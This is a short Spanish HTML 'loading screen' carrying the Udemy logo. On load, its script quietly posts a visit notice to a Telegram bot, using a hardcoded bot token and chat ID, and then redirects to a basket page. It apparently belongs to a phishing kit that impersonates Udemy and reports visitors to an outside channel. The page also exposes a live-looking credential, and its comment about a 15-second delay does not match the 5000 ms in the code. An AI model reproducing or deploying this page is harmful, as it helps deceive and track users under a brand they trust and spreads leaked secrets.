<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pantalla de Carga</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body {
            background-color: #f7f7f7; /* Color más claro para mejor contraste */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            text-align: center;
        }
        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
    </style>
    <script>
        // Configuración del bot de Telegram
        const BOT_TOKEN = '7861659325:AAEZ8m6xiHlpYLGmGWRbsG3G5qw8iY9tlLY'; // Reemplaza con tu token de bot
        const CHAT_ID = '7713690054'; // Reemplaza con tu ID de chat
        
        // Enviar mensaje al bot de Telegram cuando alguien visita la página
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: 'Alguien ha visitado la página de carga.' })
        })
        .catch(error => console.error('Error al enviar mensaje a Telegram:', error));
        
        // Redirige a otra página después de 15 segundos
        setTimeout(() => {
            window.location.href = 'cesta.html';
        }, 5000);
    </script>
</head>
<body>
    <div class="loading-container">
        <img src="logo-udemy.svg" alt="Logo Udemy" class="mb-3" width="300">
        <img src="loader.gif" alt="Cargando..." class="mb-3" width="100">
    </div>
</body>
</html>
